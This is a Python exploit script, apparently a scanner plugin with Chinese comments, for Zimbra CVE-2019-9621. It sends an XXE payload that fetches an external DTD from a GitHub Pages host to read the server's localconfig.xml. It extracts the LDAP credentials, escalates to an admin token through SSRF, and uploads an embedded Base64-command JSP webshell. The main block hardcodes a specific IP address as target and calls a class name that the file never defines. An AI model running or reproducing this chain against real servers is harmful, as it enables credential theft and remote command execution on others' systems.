#!/usr/bin/env python3

'''
name: CVE-2019-9621 任意代码执行漏洞
description: CVE-2019-9621 任意代码执行漏洞,通过上传dtd文件,来获取shell执行任意命令,需要公网的dtd,暂时用的k8gege的公网dtd文件
'''

import re
import requests
from app.lib.utils.request import request

class CVE_2019_9621_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
            "Content-Type":"application/xml"
            }
        self.username = ''
        self.password = ''
        self.low_priv_token = ''
        self.auth_body = ''
        self.admin_token = ''
        self.fileContent = r'<%@page import="java.io.*"%><%@page import="sun.misc.BASE64Decoder"%><%try {String cmd = request.getParameter("tom");String path=application.getRealPath(request.getRequestURI());String dir="weblogic";if(cmd.equals("NzU1Ng")){out.print("[S]"+dir+"[E]");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("->|");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print("|<-");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%>'

    def get_low_token(self):
        self.auth_body = """<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
           <soap:Header>
               <context xmlns="urn:zimbra">
                   <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
               </context>
           </soap:Header>
           <soap:Body>
             <AuthRequest xmlns="urn:zimbraAccount">
                <account by="adminName">{username}</account>
                <password>{password}</password>
             </AuthRequest>
           </soap:Body>
        </soap:Envelope>
        """.format(username = self.username, password = self.password)
        print("[*] Get Low Privilege Auth Token")
        req = request.post(self.url + "/service/soap", headers = self.headers, data = self.auth_body)
        pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
        self.low_priv_token = pattern_auth_token.findall(req.text)[0]

    def get_admin_token(self):
        self.headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN=" + self.low_priv_token + ";"
        self.headers["Host"]="foo:7071"
        print("[*] Get Admin  Auth Token By SSRF")
        pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
        req = request.post(self.url + "/service/proxy?target=https://127.0.0.1:7071/service/admin/soap", headers = self.headers,  data = self.auth_body)
        self.admin_token =pattern_auth_token.findall(req.text)[0]

    def upload(self):
        files = {
            'filename1':(None, "whocare", None),
            'clientFile':('shell.jsp', self.fileContent, "text/plain"),
            'requestId':(None, "12", None),
        }
        self.headers ={
            "Cookie":"ZM_ADMIN_AUTH_TOKEN=" + self.admin_token +";"
        }
        print("[*] Uploading file")
        req = request.post(self.url + "/service/extension/clientUploader/upload", headers = self.headers, files = files)
        print("Shell: " + self.url +"/downloads/shell.jsp")
        #print("Connect \"shell.jsp\" using K8fly CmdShell\nBecause the CMD parameter is encrypted using Base64(bypass WAF)")
        print("[*] Request Result:")
        s = requests.session()
        req = s.get(self.url + "/downloads/shell.jsp", headers = self.headers)
        print("May need cookie:")
        print(self.headers['Cookie'])

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url

        try:
            dtd_url = "https://k8gege.github.io/zimbra.dtd"
            """
            <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
            <!ENTITY % start "<![CDATA[">
            <!ENTITY % end "]]>">
            <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
            """
            xxe_data = r"""<!DOCTYPE Autodiscover [
                    <!ENTITY % dtd SYSTEM "{dtd}">
                    %dtd;
                    %all;
                    ]>
            <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                <Request>
                    <EMailAddress>aaaaa</EMailAddress>
                    <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
                </Request>
            </Autodiscover>""".format(dtd = dtd_url)

            req = request.post(self.url + "/Autodiscover/Autodiscover.xml",  headers = self.headers, data= xxe_data)
            if 'Error 503 Requested response schema not available' in req.text:
                print('存在CVE-2019-9621 任意代码执行漏洞')
                pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
                pattern_password = re.compile(r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
                self.username = pattern_name.findall(req.text)[0][2]
                self.password = pattern_password.findall(req.text)[0][2]
                self.get_low_token()
                self.get_admin_token()
                self.upload()
                return True
            else:
                print('不存在CVE-2019-9621 任意代码执行漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在CVE-2019-9621 任意代码执行漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2019_9670 = CVE_2019_9670_BaseVerify('https://193.87.11.178')
    CVE_2019_9670.run()